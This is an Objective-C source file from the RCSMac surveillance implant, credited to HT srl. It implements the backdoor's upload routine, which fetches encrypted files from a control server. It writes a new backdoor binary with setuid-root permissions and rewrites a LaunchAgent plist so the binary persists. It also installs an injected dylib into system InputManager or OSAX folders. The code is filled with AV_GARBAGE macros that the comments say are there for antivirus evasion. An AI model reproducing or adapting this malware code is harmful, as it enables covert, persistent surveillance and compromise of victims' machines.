/*
 * RCSMac - Upload File Network Operation
 *
 *
 * Created by revenge on 12/01/2011
 * Copyright (C) HT srl 2011. All rights reserved
 *
 */

#import "UploadNetworkOperation.h"
#import "NSMutableData+AES128.h"
#import "NSString+SHA1.h"
#import "NSData+SHA1.h"
#import "NSData+Pascal.h"
#import "RCSMCommon.h"

#import "RCSMFileSystemManager.h"
#import "RCSMLogger.h"
#import "RCSMDebug.h"

#define CORE_UPGRADE  @"core-update"
#define DYLIB_UPGRADE @"dylib-update"
#define KEXT_UPGRADE  @"kext-update"

#import "RCSMAVGarbage.h"

@implementation UploadNetworkOperation

- (id)initWithTransport: (RESTTransport *)aTransport
{
  if (self = [super init])
    {
      mTransport = aTransport;
    
#ifdef DEBUG_UP_NOP
      infoLog(@"mTransport: %@", mTransport);
#endif
      return self;
    }
  
  return nil;
}

- (void)dealloc
{
  [super dealloc];
}

- (BOOL)perform
{
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  
  uint32_t command              = PROTO_UPLOAD;
  NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSMutableData *commandData    = [[NSMutableData alloc] initWithBytes: &command
                                                                length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  NSData *commandSha            = [commandData sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  [commandData appendData: commandSha];
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  [commandData encryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  //
  // Send encrypted message
  //
  NSURLResponse *urlResponse    = nil;
  NSData *replyData             = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  NSMutableData *replyDecrypted = nil;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  replyData = [mTransport sendData: commandData
                 returningResponse: urlResponse];
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  if (replyData == nil)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_009
  
  replyDecrypted = [[NSMutableData alloc] initWithData: replyData];
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  [replyDecrypted decryptWithKey: gSessionKey];
  
  // AV evasion: only on release build
  AV_GARBAGE_007  
  
  [replyDecrypted getBytes: &command
                    length: sizeof(uint32_t)];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  // remove padding
  [replyDecrypted removePadding];
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  //
  // check integrity
  //
  NSData *shaRemote;
  NSData *shaLocal;
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      shaRemote = [replyDecrypted subdataWithRange:
                   NSMakeRange([replyDecrypted length] - CC_SHA1_DIGEST_LENGTH,
                               CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      shaLocal = [replyDecrypted subdataWithRange:
                  NSMakeRange(0, [replyDecrypted length] - CC_SHA1_DIGEST_LENGTH)];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  shaLocal = [shaLocal sha1Hash];
  
  // AV evasion: only on release build
  AV_GARBAGE_004
  
  if ([shaRemote isEqualToData: shaLocal] == NO)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_008
      
      return NO;
    }
  
  if (command != PROTO_OK)
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      return NO;
    }
  
  uint32_t packetSize     = 0;
  uint32_t numOfFilesLeft = 0;
  uint32_t filenameSize   = 0;
  uint32_t fileSize       = 0;
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  @try
    {
      [replyDecrypted getBytes: &packetSize
                         range: NSMakeRange(4, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_006
      
      [replyDecrypted getBytes: &numOfFilesLeft
                         range: NSMakeRange(8, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
      
      [replyDecrypted getBytes: &filenameSize
                         range: NSMakeRange(12, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_004
      
      [replyDecrypted getBytes: &fileSize
                         range: NSMakeRange(16 + filenameSize, sizeof(uint32_t))];
      
      // AV evasion: only on release build
      AV_GARBAGE_005
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_000
      
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_007
      
      return NO;
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_003
  
  NSData *stringData;
  NSData *fileContent;
  
  @try
    {
      // AV evasion: only on release build
      AV_GARBAGE_004
    
      stringData  = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(12, filenameSize + 4)]];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      fileContent = [[NSData alloc] initWithData:
                     [replyDecrypted subdataWithRange: NSMakeRange(16 + filenameSize + 4, fileSize)]];
      
      // AV evasion: only on release build
      AV_GARBAGE_002
    }
  @catch (NSException *e)
    {
      // AV evasion: only on release build
      AV_GARBAGE_002
    
      [replyDecrypted release];
      [commandData release];
      [outerPool release];
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      return NO;
    }
  
  NSString *filename  = [stringData unpascalizeToStringWithEncoding: NSUTF16LittleEndianStringEncoding];
  
  // AV evasion: only on release build
  AV_GARBAGE_005
  
  if (filename == nil)
    {
#ifdef DEBUG_UP_NOP
      errorLog(@"filename is empty, error on unpascalize");
#endif
    }
  else
    {
      // AV evasion: only on release build
      AV_GARBAGE_003
    
      if ([filename isEqualToString: CORE_UPGRADE])
        {
          // AV evasion: only on release build
          AV_GARBAGE_000
          
          BOOL success = NO;
          NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                    [[NSBundle mainBundle] bundlePath],
                                    gBackdoorUpdateName];
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          [fileContent writeToFile: _upgradePath
                        atomically: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          //
          // Forcing suid permission on the backdoor upgrade
          //
          u_long permissions  = (S_ISUID | S_IRWXU | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          NSValue *permission = [NSNumber numberWithUnsignedLong: permissions];
          
          // AV evasion: only on release build
          AV_GARBAGE_002
          
          NSValue *owner      = [NSNumber numberWithInt: 0];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          NSDictionary *tempDictionary = [NSDictionary dictionaryWithObjectsAndKeys:
                                          permission,
                                          NSFilePosixPermissions,
                                          owner,
                                          NSFileOwnerAccountID,
                                          nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          success = [[NSFileManager defaultManager] setAttributes: tempDictionary
                                                     ofItemAtPath: _upgradePath
                                                            error: nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          if (success == NO)
            {
#ifdef DEBUG_UP_NOP
              warnLog(@"Error while changing attributes on the upgrade file");
#endif
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_005
          
          [_upgradePath release];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          //
          // Once the backdoor has been written, edit the backdoor Loader in order to
          // load the new updated backdoor upon reboot/login
          //
          NSString *backdoorLaunchAgent = createLaunchdPlistPath();
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          NSError *error = nil;
          if ([[NSFileManager defaultManager] removeItemAtPath: backdoorLaunchAgent
                                                         error: &error] == NO)
            {
#ifdef DEBUG_UP_NOP
              errorLog(@"Error while removing LaunchAgent file, reason: %@", [error localizedDescription]);
#endif
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_008
          
          NSString *backdoorDaemonName = [NSString stringWithFormat:@"%@.%@.%@", 
                                          DOMAIN_COM, 
                                          DOMAIN_APL, 
                                          LAUNCHD_NAME];
          
          success = [gUtil createLaunchAgentPlist: backdoorDaemonName
                                        forBinary: gBackdoorUpdateName];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          if (success == NO)
            {
#ifdef DEBUG_UP_NOP
              errorLog(@"Error while writing backdoor launchAgent plist");
#endif
            }
          else
            {
#ifdef DEBUG_UP_NOP
              infoLog(@"LaunchAgent file updated");
#endif
            }
        }
      else if ([filename isEqualToString: DYLIB_UPGRADE])
        {
          // AV evasion: only on release build
          AV_GARBAGE_001        
          
          NSString *_upgradePath;
          NSString *_tempLocalPath = [[NSString alloc] initWithFormat:
                                      @"%@/%@",
                                      [[NSBundle mainBundle] bundlePath],
                                      gInputManagerName];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          if ([gUtil isLeopard])
            {
              // AV evasion: only on release build
              AV_GARBAGE_003
            
              _upgradePath = [[NSString alloc] initWithFormat:
                              @"/%@/%@/%@/%@.%@/%@/%@/%@", 
                              LIBRARY_NSSTRING, IM_FOLDER, IM_NAME, IM_NAME, IM_EXT, IM_CONTENTS, IM_MACOS,
                              gInputManagerName];
              
              // AV evasion: only on release build
              AV_GARBAGE_001
              
              //
              // Force owner since we can't remove that file if not owned by us
              // with removeItemAtPath:error (Required only on Leopard)
              //
              NSString *userAndGroup = [NSString stringWithFormat: @"%@:staff", NSUserName()];
              
              // AV evasion: only on release build
              AV_GARBAGE_006
              
              NSArray *_tempArguments = [[NSArray alloc] initWithObjects:
                                         userAndGroup,
                                         _upgradePath,
                                         nil];
              
              // AV evasion: only on release build
              AV_GARBAGE_003
              
              [gUtil executeTask: @"/usr/sbin/chown"
                   withArguments: _tempArguments
                    waitUntilEnd: YES];
              
              // AV evasion: only on release build
              AV_GARBAGE_001
            }
          else
            {
              // AV evasion: only on release build
              AV_GARBAGE_002
            
              _upgradePath = [[NSString alloc] initWithFormat:@"/%@/%@/%@/%@/%@/%@", 
                              LIBRARY_NSSTRING, 
                              OSAX_FOLDER, 
                              OSAX_NAME, 
                              IM_CONTENTS, 
                              IM_MACOS, 
                              gInputManagerName];
            
              // AV evasion: only on release build
              AV_GARBAGE_001
            }
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
          // Now remove it
          [[NSFileManager defaultManager] removeItemAtPath: _upgradePath
                                                     error: nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          // And write it back
          [fileContent writeToFile: _upgradePath
                        atomically: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_008
    
          //
          // Write it inside the local folder so that next time the backdoor starts
          // it won't overwrite it within the old one
          //
          [[NSFileManager defaultManager] removeItemAtPath: _tempLocalPath
                                                     error: nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_003
  
          [fileContent writeToFile: _tempLocalPath
                        atomically: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_006
          
          [_tempLocalPath release];
          
          // AV evasion: only on release build
          AV_GARBAGE_009
          
          NSArray *arguments = [NSArray arrayWithObjects:
                                @"-R",
                                @"root:admin",
                                _upgradePath,
                                nil];
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          [gUtil executeTask: @"/usr/sbin/chown"
               withArguments: arguments
                waitUntilEnd: YES];
          
          // AV evasion: only on release build
          AV_GARBAGE_001
          
          [_upgradePath release];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
          
        }
      else
        {
          
          // AV evasion: only on release build
          AV_GARBAGE_001
        
          __m_MFileSystemManager *fsManager = [[__m_MFileSystemManager alloc] init];
          
          // AV evasion: only on release build
          AV_GARBAGE_007
          
          [fsManager createFile: filename
                       withData: fileContent];
          
          // AV evasion: only on release build
          AV_GARBAGE_000
  
          [fsManager release];
        }
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  [fileContent release];
  [stringData release];
  [replyDecrypted release];
  [commandData release];
  [outerPool release];
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  //
  // Get files until there's no one left
  //
  if (numOfFilesLeft != 0)
    {
      return [self perform];
    }
  
  // AV evasion: only on release build
  AV_GARBAGE_002
  
  return YES;
}

@end
